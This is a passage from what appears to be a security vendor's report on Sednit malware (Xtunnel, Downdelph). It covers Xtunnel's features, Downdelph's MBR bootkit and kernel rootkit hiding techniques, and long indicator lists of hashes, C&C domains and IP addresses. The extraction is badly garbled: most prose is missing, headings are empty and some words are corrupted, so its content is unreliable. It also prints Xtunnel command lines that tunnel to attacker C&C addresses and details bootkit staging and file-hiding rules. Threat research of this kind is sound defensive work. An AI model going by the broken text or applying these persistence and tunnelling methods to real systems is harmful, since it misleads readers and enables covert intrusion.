+Xtunnel  
+TunnelID
+
+Xtunnel
+
+is you live?  
+Xtunnel Xtunnel OK
+
+Xtunnel  
+
+Xtunnel
+
+The TunnelID  
+
+TunnelID
+
+Additional Features
+Xtunnel  
+
+UDP Tunneling (August 2013)
+Xtunnel  
+
+176.31.112.10  
+Xtunnel  
+
+i`m wait
+error 2003 recv from TPS - %d
+error 2002 send to server UDP - %d
+recv from client UDP - %d
+
+TLS Encryption (April 2014)
+
+[90]. These new Xtunnel
+Xtunnel 
+
+Xtunnel  
+Xtunnel
+
+HTTP Proxy Connection (February 2015)
+
+Xtunnel
+
+Xtunnel
+WinHttpGetIEProxyConfigForCurrentUser [91]  
+
+10.1.1.1:8080
+
+[92]
+xaps_through_squid_default_proxy.
+
+Xtunnel HTTP CONNECT [93]  
+
+Command Line Parameter Parser (April 2015)
+Xtunnel  
+
+Parameter Prefix Meaning
+
+-Si
+
+Xtunnel
+
+-Si 176.31.96.178 -Sp 443 -Pi 10.30.0.47 -Pp 8080 -SSL
+-Si 46.183.216.209 -Sp 443 -Pi 10.30.0.11 -Pp 8080 -SSL
+-Si 95.215.46.27 -Sp 443 -HTTP
+
+HTTP Persistent Connection (June 2015)
+
+[94] Xtunnel  
+TLS protocol
+HTTP GET TLS protocol
+
+Connection: keep-alive
+
+Xtunnel is Accept-Language: 
+ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4
+
+ru-RU
+
+Code Obfuscation (July 2015)
+Xtunnel  
+
+Xtunnel
+
+[95].
+Xtunnel
+
+[96] Xtunnel
+
+Xtunnel CFG before obfuscation
+
+Xtunnel CFG after obfuscation
+
+Conclusion and Open Questions
+Xtunnel
+
+Xtunnel  
+
+CLOSING REMARKS
+Xagent 
+
+Sedreco
+Xtunnel  
+
+[97]
+
+[98]  
+
+The Third Part of the Trilogy
+
+ATTACK FIRST-STAGE SECOND-STAGE PIVOT 
+METHODS MALWARE MALWARE MALWARE
+
+Seduploader Seduploader Sedreco Sedreco
+dropper payload dropper payload Xtunnel
+
+Sedkit
+
+Usbstealer
+
+Email
+attachments
+
+Downdelph Xagent
+
+Fake webmail 
+login panels
+
+En Route En Route En Route 
+with Sednit with Sednit with Sednit
+
+Part 1 Part 3 Part 2
+
+In this third part Downdelph.  
+
+Usbstealer
+
+[5]  
+[6]
+
+DOWNDELPH
+
+Identikit
+Downdelph is a lightweight downloader developed  
+in the Delphi programming language
+
+Alternative Names
+Delphacy
+
+Usage
+Downdelph
+
+Downdelph  
+
+Xagent Sedreco
+
+Known period of activity
+
+Known deployment methods
+
+Distinguishing characteristics
+Downdelph  
+
+[11].
+Downdelph
+
+Downdelph intelmeserver.com
+
+Timeline
+Downdelph  
+
+[100]
+
+2013 2014 2014
+November February March
+
+Oldest observed Three Downdelph Downdelph deploy-
+Downdelph deploy- deployments. Persis- ment. Persistence is 
+ment. Persistence is tence is ensured by a ensured by a boooottkkitit 
+ensured by a bootkit kernel mode rootkit infecting the MBR 
+infecting the Master installed as a Windows of the hard drive (Case 5).
+Boot Record (MBR) of service (Cases 2, 3 and 4).
+the hard drive (labeled 
+Case 1 in Figure 3).
+
+2015 2014
+September May
+
+Most recently observed Downdelph deploy-
+Downdelph deploy- ment. Persistence is 
+ment. Persistence is ensured by registering 
+ensured by registering an auto-start entry in 
+an auto-start entry in the Windows Registry 
+the Windows Registry (Case 6).
+(Case 7).
+
+Downdelph
+
+Deployment
+Downdelph.  
+
+Downdelph  
+Downdelph deployments, with the purpose and name of each file
+
+[101]
+sysprep.exe [102].
+
+Decoy document used in Case 7 (September 2015)
+
+Core Behavior
+Downdelph TMyDownloader  
+
+Downdelph  
+
+Downdelph communication workflow
+
+Extend C&C servers List
+Downdelph extended.ini
+
+HTTP POST  
+Downdelph request to download main configuration file
+
+Down-
+delph
+
+[104]  
+[options]  
+
+Key Value
+Servers NULL
+
+Crypt
+
+Sleep
+
+Key NULL
+
+Servers Downdelph  
+
+Seduploader Xagent.
+
+Payload Download
+
+in extended.ini Downdelph
+
+pinlt.ini  
+
+Key Value
+
+Sleep
+extended.ini
+
+Crypt
+
+Key
+in extended.ini
+
+FileName
+
+PathToSave
+shell
+
+Execute
+
+RunApp rundll32.exe
+
+Parameters
+
+Delete
+
+DelSec
+
+Downdelph  
+
+Downdelph
+Sleep
+
+Downdelph  
+Sedreco Xagent.
+
+Persistence Mechanisms
+Downdelph
+
+Bootkit
+Downdelph bootkit  
+
+in [105] A type of rootkit that infects the Master 
+Boot Record or Volume Boot Record (VBR) on a hard disk drive in order to ensure that its code will be run  
+each time the computer boots. [… ]
+
+Downdelph  
+
+Downdelph.
+
+Installation Process
+
+Sector 1 Sector 2 Sector 3
+
+Bootkit MBR Original MBR Bootkit Code Bootkit Driver Legitimate 
+(XOR-encrypted) (XOR-encrypted) (XOR-encrypted, data
+
+RC4-encrypted)
+
+[106] MBR opening code, as seen in a decompiler
+
+WriteFile 
+
+HKLM\SYSTEM\
+CurrentControlSet\Control\Lsa\Core Packages  
+
+Downdelph
+Impersonation Packages.
+
+[107]
+
+struct PackedChunkHeader
+{
+    DWORD magic; // set to `0x203a3320` (` :3 ` in ASCII)
+    DWORD packed_size;
+    DWORD unpacked_size;
+    DWORD key_size;
+    BYTE  rc4_key[16];
+};
+
+0x19B
+
+Startup Process
+
+Bootkit MBR Original MBR CPU in real mode
+
+Hooks interruption 13h Hooks bootmgr
+Decrypts bootkit code 
+at physical address 
+0x97C00 Boot Manager 
+Decrypts and executes (bootmgr)
+original MBR Hooks function 
+
+OSIArchTransferToKernel 
+
+in winload.exe
+CPU in 
+protected 
+
+Boot loader mode
+Bootkit driver ACPI.sys (winload.exe)
+
+Decrypts and injects Decrypts and executes Hooks ACPI.sys 
+bootkit user-mode bootkit driver entry point
+component in 
+explorer.exe
+
+Bootkit user mode 
+component Downdelph
+
+Loads Downdelph in 
+explorer.exe process
+
+[108]
+
+0x97C00
+bootmgr winload.exe ACPI.
+
+sys  
+
+ACPI.sys  
+
+Hook code in ACPI.sys resources section (.rsrc)
+
+ntoskrnl.
+
+exe  
+ACPI.sys  
+
+0x97C00
+MmMapIoSpace [109]
+
+ACPI.sys  
+
+explorer.exe  
+
+Downdelph
+m_bLoadedByBootkit in Downdelph TRUE User mode bootkit component attempts to set an exported Boolean variable 
+in Downdelph, after having loaded it
+
+Downdelph
+
+Entry ep_data. 
+[99]. 
+
+Kernel Mode Rootkit
+Downdelph  
+
+Downdelph [110]
+
+Hide rules
+
+Hide rules  
+
+HIDEDRV: >>>>>>>>Hide rules>>>>>>>> rules
+HIDEDRV: File rules: \Device\HarddiskVolume1\Windows\system32\mypathcom\dnscli1.dll
+HIDEDRV: File rules: \Device\HarddiskVolume1\Windows\system32\drivers\FsFlt.sys
+HIDEDRV: Registry rules: \REGISTRY\MACHINE\SYSTEM\ControlSet002\services\FsFlt
+HIDEDRV: Registry rules: \REGISTRY\MACHINE\SYSTEM\ControlSet001\services\FsFlt
+HIDEDRV: Registry rules: \REGISTRY\MACHINE\SYSTEM\CurrentControlSet\services\FsFlt
+HIDEDRV: Inject dll: C:\Windows\system32\mypathcom\dnscli1.dll
+HIDEDRV: Folder rules: \Device\HarddiskVolume1\Windows\system32\mypathcom
+HIDEDRV: <<<<<<<<XXXXX<<<<<<<< rules
+HIDEDRV: <<<<<<<<Hide rules<<<<<<<< rules
+
+File rules  
+Downdelph […] \dnscli1.dll  
+
+[…] \FsFlt.sys
+Registry rules.  
+
+Folder rules  
+Downdelph […] \mypathcom
+
+Inject dll  
+explorer.exe Downdelph.
+
+HIDEDRV
+
+[62]
+
+d:\!work\etc\hi\Bin\Debug\win7\x86\fsflt.pdb
+d:\!work\etc\hideinstaller_kis2013\Bin\Debug\win7\x64\fsflt.pdb
+d:\new\hideinstaller\Bin\Debug\wxp\x86\fsflt.pdb
+
+Downdelph  
+Downdelph explorer.exe
+
+Hiding Artifacts
+
+[111]  
+[112].
+
+SSDT Hooking
+
+ZwSetInformationFile
+
+ZwQueryDirectoryFile ZwEnumerateKey.
+
+Hide rules  
+
+ZwSetInformationFile  
+Hook code for ZwSetInformationFile to hide files
+
+[113]  
+
+Minifilter Driver
+[112] minifilter  
+
+pre  
+post
+
+descending
+
+370030  
+passThrough.sys [114]  
+
+[115]  
+passThrough.sys
+
+pre
+[116]  
+
+Preoperation callback for IRP_MJ_CREATE  
+(the creation or opening of files and directories)
+
+[117]
+
+[…] win7\x64\fsflt.pdb
+
+DLL Injection
+
+Inject dll Downdelph explorer.exe
+explorer.exe LoadLibraryW on Downdelph
+
+[118]  
+Kernel mode APC registration, FN_ApcNormalRoutine being the shellcode 
+address in the target process
+
+CONCLUSION AND OPEN QUESTIONS
+Downdelph  
+
+Downdelph  
+
+Downdelph
+
+Email Attachments
+ESET Detection Names
+
+Win32/Exploit.CVE-2015-1641.H
+Win32/Exploit.CVE-2015-2424.A
+
+Hashes
+76053b58643d0630b39d8c9d3080d7db5d017020
+9b276a0f5fd824c3dff638c5c127567c65222230
+e7f7f6caaede6cc29c2e7e4888019f2d1be37cef
+ef755f3fa59960838fa2b37b7dedce83ce41f05c
+
+File Names
+Exercise_Noble_Partner_16.rtf
+Iran_nuclear_talks.rtf
+Putin_Is_Being_Pushed_to_Prepare_for_War.rtf
+Statement by the Spokesperson of European Union on the latest developments in eastern 
+Ukraine.rtf
+
+Sedkit
+Domain Names
+
+aljazeera-news.com
+
+ausameetings.com
+
+bbc-press.org
+
+cnnpolitics.eu
+
+dailyforeignnews.com
+
+dailypoliticsnews.com
+
+defenceiq.us
+defencereview.eu
+
+diplomatnews.org
+
+euronews24.info
+
+euroreport24.com
+
+kg-news.org
+
+military-info.eu
+
+militaryadviser.org
+
+militaryobserver.net
+
+nato-hq.com
+nato-news.com
+
+natoint.com
+
+natopress.com
+
+osce-info.com
+
+osce-press.org
+
+pakistan-mofa.net
+
+politicalreview.eu
+
+politicsinform.com
+
+reuters-press.com
+
+shurl.biz
+
+stratforglobal.net
+
+thediplomat-press.com
+
+theguardiannews.org
+
+trend-news.org
+
+unian-news.info
+
+unitednationsnews.eu
+
+virusdefender.org
+
+worldmilitarynews.org
+
+worldpoliticsnews.org
+
+worldpoliticsreviews.com
+
+worldpostjournal.com
+
+Seduploader
+ESET Detection Names
+
+OSX/Agent.AE
+
+Win32/Agent.XBZ
+Win32/Agent.XIA
+Win32/Agent.XIJ
+Win32/Agent.XIO
+Win32/Agent.XFK
+Win32/Sednit.Z
+Win32/Sednit.AA
+Win32/Sednit.AB
+Win32/Sednit.AC
+Win32/Sednit.AF
+Win32/Sednit.AG
+Win32/Sednit.AR
+Win32/Sednit.AS
+Win32/Sednit.AT
+Win32/Sednit.AU
+Win32/Small.NNY
+Win64/TrojanDropper.Small.A
+Win64/TrojanDropper.Small.B
+Win64/Agent.DJ
+
+Hashes
+015425010bd4cf9d511f7fcd0fc17fc17c23eec1
+0f7893e2647a7204dbf4b72e50678545573c3a10
+10686cc4e46cf3ffbdeb71dd565329a80787c439
+17661a04b4b150a6f70afdabe3fd9839cc56bee8
+21835aafe6d46840bb697e8b0d4aac06dec44f5b
+2663eb655918c598be1b2231d7c018d8350a0ef9
+2c86a6d6e9915a7f38d119888ede60b38ab1d69d
+351c3762be9948d01034c69aced97628099a90b0
+3956cfe34566ba8805f9b1fe0d2639606a404cd4
+4d5e923351f52a9d5c94ee90e6a00e6fced733ef
+4fae67d3988da117608a7548d9029caddbfb3ebf
+51b0e3cd6360d50424bf776b3cd673dd45fd0f97
+51e42368639d593d0ae2968bd2849dc20735c071
+5c3e709517f41febf03109fa9d597f2ccc495956
+63d1d33e7418daf200dc4660fc9a59492ddd50d9
+69d8ca2a02241a1f88a525617cf18971c99fb63b
+6fb3fd8c2580c84314b14510944700144a9e31df
+80dca565807fa69a75a7dd278cef1daaee34236e
+842b0759b5796979877a2bac82a33500163ded67
+8f99774926b2e0bf85e5147aaca8bbbbcc5f1d48
+90c3b756b1bb849cba80994d445e96a9872d0cf5
+99f927f97838eb47c1d59500ee9155adb55b806a
+9fc43e32c887b7697bf6d6933e9859d29581ead0
+a43ef43f3c3db76a4a9ca8f40f7b2c89888f0399
+a5fca59a2fae0a12512336ca1b78f857afc06445
+a857bccf4cc5c15b60667ecd865112999e1e56ba
+b4a515ef9de037f18d96b9b0e48271180f5725b7
+b7788af2ef073d7b3fb84086496896e7404e625e
+b8aabe12502f7d55ae332905acee80a10e3bc399
+c1eae93785c9cb917cfb260d3abf6432c6fdaf4d
+c2e8c584d5401952af4f1db08cf4b6016874ddac
+c345a85c01360f2833752a253a5094ff421fc839
+d3aa282b390a5cb29d15a97e0a046305038dbefe
+d85e44d386315b0258847495be1711450ac02d9f
+d9989a46d590ebc792f14aa6fec30560dfe931b1
+e5fb715a1c70402774ee2c518fb0e4e9cd3fdcff
+e742b917d3ef41992e67389cd2fe2aab0f9ace5b
+ed9f3e5e889d281437b945993c6c2a80c60fdedc
+f024dbab65198467c2b832de9724cb70e24af0dd
+f3d50c1f7d5f322c1a1f9a72ff122cac990881ee
+f7608ef62a45822e9300d390064e667028b75dea
+
+File Names
+amdcache.dll
+
+api-ms-win-core-advapi-l1-1-0.dll
+
+api-ms-win-downlevel-profile-l1-1-0.dll
+
+api-ms-win-samcli-dnsapi-0-0-0.dll
+
+apisvcd.dll
+
+btecache.dll
+
+cormac.mcr
+
+csrs.dll
+
+csrs.exe
+hazard.exe
+hello32.dll
+hpinst.exe
+iprpp.dll
+
+lsasrvi.dll
+
+mgswizap.dll
+
+runrun.exe
+vmware_manager.exe
+
+Temporary File Names
+jhuhugit.temp
+
+jhuhugit.tmp
+
+jkeyskw.temp
+
+Registry Keys
+HKCU\Software\Microsoft\Office test\Special\Perf
+
+Mutex Names
+//dfc01ell6zsq3-ufhhf
+\BaseNamedObjects\513AbTAsEpcq4mf6TEacB
+\BaseNamedObjects\ASLIiasiuqpssuqkl713h
+\BaseNamedObjects\B5a20F03e6445A6987f8EC87913c9
+\BaseNamedObjects\sSbydFdIob6NrhNTJcF89uDqE2
+ASijnoKGszdpodPPiaoaghj8127391
+
+C&C Server Domain Names
+swsupporttools.com
+
+www.capisp.com
+
+www.dataclen.org
+
+www.mscoresvw.com
+
+www.windowscheckupdater.net
+
+www.acledit.com
+
+www.biocpl.org
+
+www.wscapi.com
+
+www.tabsync.net
+
+www.storsvc.org
+
+www.winupdatesysmic.com
+
+PDB Paths
+D:\REDMINE\JOINER\HEADER_PAYLOAD\header_payload\Uploader\Release\Uploader.pdb
+
+Xagent
+ESET Detection Names
+
+Linux/Fysbis
+Win32/Agent.VQQ
+Win32/Agent.WGJ
+Win32/Agent.WLF
+Win32/Agent.XIO
+Win32/Agent.XIP
+Win32/Agent.XPY
+Win32/Agent.XPZ
+Win32/Agent.XVD
+Win32/Agent.XWX
+Win64/Agent.ED
+Win64/Agent.EZ
+iOS/XAgent.A
+
+iOS/XAgent.B
+
+Hashes
+Windows
+
+072933fa35b585511003f36e3885563e1b55d55a
+082141f1c24fb49981cc70a9ed50cda582ee04dd
+08c4d755f14fd6df76ec86da6eab1b5574dfbafd
+0f04dad5194f97bb4f1808df19196b04b4aee1b8
+3403519fa3ede4d07fb4c05d422a9f8c026cedbf
+499ff777c88aeacbbaa47edde183c944ac7e91d2
+4b74c90c9d9ce7668aa9eb09978c1d8d4dfda24a
+4bc32a3894f64b4be931ff20390712b4ec605488
+5f05a8cb6fef24a91b3bd6c137b23ab3166f39ae
+71636e025fa308fc5b8065136f3dd692870cb8a4
+780aa72f0397cb6c2a78536201bd9db4818fa02a
+7e33a52e53e85ddb1dc8dc300e6558735acf10ce
+a70ed3ae0bc3521e743191259753be945972118b
+baa4c177a53cfa5cc103296b07b62565e1c7799f
+c18edcba2c31533b7cdb6649a970dce397f4b13c
+d00ac5498d0735d5ae0dea42a1f477cf8b8b0826
+d0db619a7a160949528d46d20fc0151bf9775c32
+e816ec78462b5925a1f3ef3cdb3cac6267222e72
+f1ee563d44e2b1020b7a556e080159f64f3fd699
+
+Linux
+9444d2b29c6401bc7c2d14f071b11ec9014ae040
+ecdda7aca5c805e5be6e0ab2017592439de7e32c
+f080e509c988a9578862665b4fcf1e4bf8d77c3e
+
+File Names
+rwte.dll
+
+splm.dll
+
+lg3.exe
+api-ms-win-downlevel-profile-l1-1-0.dll
+
+C&C server Domain Names
+ciscohelpcenter.com
+
+microsoftsupp.com
+
+timezoneutc.com
+
+inteldrv64.com
+advpdxapi.com
+
+C&C server IP Addresses
+185.106.120.101
+185.86.149.223
+31.220.43.99
+5.135.183.154
+69.12.73.174
+89.32.40.4
+92.114.92.125
+93.115.38.125
+
+Sedreco
+ESET Detection Names
+
+Win32/Sednit.AJ
+Win32/Sednit.AL
+Win32/Sednit.AO
+Win32/Sednit.C
+Win32/Sednit.E
+Win32/Sednit.F
+Win32/Sednit.H
+Win32/Sednit.S
+Win32/Sednit.U
+Win32/Sednit.W
+Win32/Sednit.Y
+Win64/Sednit.B
+Win64/Sednit.G
+
+Hashes
+Dropper
+
+4f895db287062a4ee1a2c5415900b56e2cf15842
+87f45e82edd63ef05c41d18aeddeac00c49f1aee
+8ee6cec34070f20fd8ad4bb202a5b08aea22abfa
+9e779c8b68780ac860920fcb4a8e700d97f084ef
+c23f18de9779c4f14a3655823f235f8e221d0f6a
+e034e0d9ad069bab5a6e68c1517c15665abe67c9
+e17615331bdce4afa45e4912bdcc989eacf284bc
+
+Payload
+04301b59c6eb71db2f701086b617a98c6e026872
+11af174294ee970ac7fd177746d23cdc8ffb92d7
+e3b7704d4c887b40a9802e0695bae379358f3ba0
+
+File Names
+Dropper
+
+scroll.dll
+
+wintraysys.exe
+
+Payload
+advstorshell.dll
+
+mfxscom.dll
+
+Dropped Files
+%ALLUSERSPROFILE%\msd
+%TEMP%\__2315tmp.dat
+%TEMP%\__4964tmp.dat
+
+Registry Keys
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Path
+HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Path
+
+Mutexes
+\BaseNamedObjects\AZZYMTX
+\BaseNamedObjects\MutYzAz
+
+C&C server Domain Names
+1oo7.net
+akamaisoft.com
+
+cloudflarecdn.com
+
+driversupdate.info
+
+kenlynton.com
+
+microsoftdriver.com
+
+microsofthelpcenter.info
+
+nortonupdate.org
+
+softwaresupportsv.com
+
+symantecsupport.org
+
+updatecenter.name
+
+updatesystems.net
+
+updmanager.com
+
+windowsappstore.net
+
+Xtunnel
+ESET Detection Names
+
+Win32/Agent.RGB
+Win32/Agent.RGD
+Win32/Agent.RGS
+Win32/Agent.RKP
+Win32/Agent.RME
+Win32/Agent.RMG
+Win32/Agent.RMR
+Win32/Agent.RQI
+
+Hashes
+0450aaf8ed309ca6baf303837701b5b23aac6f05
+067913b28840e926bf3b4bfac95291c9114d3787
+1535d85bee8a9adb52e8179af20983fb0558ccb3
+42dee38929a93dfd45c39045708c57da15d7586c
+8f4f0edd5fb3737914180ff28ed0e9cca25bf4cc
+982d9241147aaacf795174a9dab0e645cf56b922
+99b454262dc26b081600e844371982a49d334e5e
+c637e01f50f5fbd2160b191f6371c5de2ac56de4
+c91b192f4cd47ba0c8e49be438d035790ff85e70
+cdeea936331fcdd8158c876e9d23539f8976c305
+db731119fca496064f8045061033a5976301770d
+de3946b83411489797232560db838a802370ea71
+e945de27ebfd1baf8e8d2a81f4fb0d4523d85d6a
+
+C&C server IP Addresses
+131.72.136.165
+167.114.214.63
+176.31.112.10
+176.31.96.178
+192.95.12.5
+46.183.216.209
+80.255.10.236
+80.255.3.93
+81.17.30.29
+95.215.46.27
+
+PDB Paths
+H:\last version 23.04\UNvisible crypt version XAPS select - копия\XAPS_OBJECTIVE\
+Release\XAPS_OBJECTIVE.pdb
+C:\Users\User\Desktop\xaps_through_squid_default_proxy\Release\XAPS_OBJECTIVE.pdb
+C:\Users\John\Documents\Новая папк\XAPS_OBJECTIVE\Release\XAPS_OBJECTIVE.pdb
+E:\PROJECT\XAPS_OBJECTIVE_DLL\Release\XAPS_OBJECTIVE.pdb
+
+Downdelph
+ESET Detection Names
+
+Win32/Rootkit.Agent.OAW
+Win32/Rootkit.Agent.OAY
+Win32/Sednit.AZ
+Win32/Sednit.BA
+Win32/Sednit.BB
+Win32/Sednit.K
+Win64/Sednit.J
+
+Hashes
+1cc2b6b208b7687763659aeb5dcb76c5c2fbbf26
+49acba812894444c634b034962d46f986e0257cf
+4c9c7c4fd83edaf7ec80687a7a957826de038dd7
+4f92d364ce871c1aebbf3c5d2445c296ef535632
+516ec3584073a1c05c0d909b8b6c15ecb10933f1
+593d0eb95227e41d299659842395e76b55aa048d
+5c132ae63e3b41f7b2385740b9109b473856a6a5
+5fc4d555ca7e0536d18043977602d421a6fd65f9
+669a02e330f5afc55a3775c4c6959b3f9e9965cf
+6caa48cd9532da4cabd6994f62b8211ab9672d9e
+7394ea20c3d510c938ef83a2d0195b767cd99ed7
+9f3ab8779f2b81cae83f62245afb124266765939
+e8aca4b0cfe509783a34ff908287f98cab968d9e
+ee788901cd804965f1cd00a0afc713c8623430c4
+
+File Names
+apivscd.dll
+
+install_com_x32_LL_full.dll
+shcore.dll
+
+userinit.exe
+
+Registry Keys
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\LastEnum
+SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\shell
+
+C&C server Domain Names
+intelmeserver.com
+
+C&C server IP addresses
+104.171.117.216
+141.255.160.52
+
+PDB Paths
+d:\\!work\\etc\\hideinstaller_kis2013\\Bin\\Debug\\win7\\x64\\fsflt.pdb
+d:\\new\\hideinstaller\\Bin\\Debug\\wxp\\x86\\fsflt.pdb
+d:\\!work\\etc\\hi\\Bin\\Debug\\win7\\x86\\fsflt.pdb
